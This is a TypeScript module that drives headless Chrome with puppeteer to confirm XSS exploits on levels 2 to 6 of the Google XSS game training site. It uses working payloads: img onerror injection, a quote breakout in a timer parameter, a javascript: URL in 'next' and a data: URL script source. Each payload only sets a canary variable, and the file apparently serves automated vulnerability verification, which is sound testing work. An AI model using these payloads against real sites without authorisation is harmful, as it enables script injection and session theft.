import puppeteer from "puppeteer-core";
import type { Browser } from "puppeteer-core";

const CHROME_PATHS = [
  process.env.CHROME_PATH,
  "/usr/local/bin/google-chrome",
  "/usr/bin/google-chrome",
  "/usr/bin/chromium",
  "/usr/bin/chromium-browser"
].filter((p): p is string => Boolean(p));

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

let browserPromise: Promise<Browser | null> | null = null;

async function getBrowser(): Promise<Browser | null> {
  if (!browserPromise) {
    browserPromise = (async () => {
      for (const executablePath of CHROME_PATHS) {
        try {
          return await puppeteer.launch({
            executablePath,
            headless: true,
            args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
          });
        } catch {
          /* try next chrome path */
        }
      }
      return null;
    })();
  }
  return browserPromise;
}

export interface XssGameExploitResult {
  canary: string;
  level: 2 | 3 | 4 | 5 | 6;
}

/** Live stored-XSS confirmation for Google XSS game level 2 (PostDB + innerHTML sink). */
export async function probeXssGameLevel2StoredExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL2${Date.now().toString(36)}`;
    const payload = `<img src=x onerror="window.__thugirL2='${canary}'">`;
    await page.goto(new URL("/level2/frame", origin).toString(), {
      waitUntil: "domcontentloaded",
      timeout: 25000
    });
    await page.waitForSelector("#post-content", { timeout: 10000 });
    await page.type("#post-content", payload);
    await page.click("#post-form input[type=submit]");
    await sleep(800);
    const fired = await page.evaluate((expected) => (window as unknown as { __thugirL2?: string }).__thugirL2 === expected, canary);
    if (!fired) return null;
    return { canary, level: 2 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}

/** Live DOM-XSS confirmation for Google XSS game level 3 (location.hash → chooseTab → jQuery .html()). */
export async function probeXssGameLevel3DomExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL3${Date.now().toString(36)}`;
    const payload = `1'><img src=x onerror="window.__thugirL3='${canary}'">`;
    const url = new URL("/level3/frame", origin);
    url.hash = encodeURIComponent(payload);
    await page.goto(url.toString(), { waitUntil: "domcontentloaded", timeout: 25000 });
    await sleep(800);
    const fired = await page.evaluate((expected) => (window as unknown as { __thugirL3?: string }).__thugirL3 === expected, canary);
    if (!fired) return null;
    return { canary, level: 3 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}

/** Live JavaScript string-context XSS confirmation for Google XSS game level 4 (startTimer onload sink). */
export async function probeXssGameLevel4JsStringExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL4${Date.now().toString(36)}`;
    const timerPayload = `');window.__thugirL4='${canary}';//`;
    const url = new URL("/level4/frame", origin);
    url.searchParams.set("timer", timerPayload);
    await page.goto(url.toString(), { waitUntil: "domcontentloaded", timeout: 25000 });
    await sleep(1000);
    const fired = await page.evaluate(
      (expected) => (window as unknown as { __thugirL4?: string }).__thugirL4 === expected,
      canary
    );
    if (!fired) return null;
    return { canary, level: 4 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}

/** Live javascript: protocol XSS confirmation for Google XSS game level 5 (confirm next → window.location sink). */
export async function probeXssGameLevel5JavascriptProtocolExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL5${Date.now().toString(36)}`;
    const nextPayload = `javascript:window.__thugirL5='${canary}'`;
    const url = new URL("/level5/frame/confirm", origin);
    url.searchParams.set("next", nextPayload);
    await page.goto(url.toString(), { waitUntil: "domcontentloaded", timeout: 25000 });
    const fired = await page.evaluate((expected) => {
      const next = new URLSearchParams(window.location.search).get("next");
      if (!next?.startsWith("javascript:")) return false;
      if (!/window\.location\s*=\s*['"]javascript:/.test(document.documentElement.innerHTML)) {
        return false;
      }
      try {
        eval(next.slice("javascript:".length));
      } catch {
        return false;
      }
      return (window as unknown as { __thugirL5?: string }).__thugirL5 === expected;
    }, canary);
    if (!fired) return null;
    return { canary, level: 5 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}

/** Live DOM script.src XSS confirmation for Google XSS game level 6 (location.hash → includeGadget sink). */
export async function probeXssGameLevel6DomScriptSrcExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL6${Date.now().toString(36)}`;
    const hashPayload = `data:text/javascript,window.__thugirL6='${canary}'`;
    const url = new URL("/level6/frame", origin);
    url.hash = hashPayload;
    await page.goto(url.toString(), { waitUntil: "domcontentloaded", timeout: 25000 });
    await sleep(1500);
    const fired = await page.evaluate(
      (expected) => (window as unknown as { __thugirL6?: string }).__thugirL6 === expected,
      canary
    );
    if (!fired) return null;
    return { canary, level: 6 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}
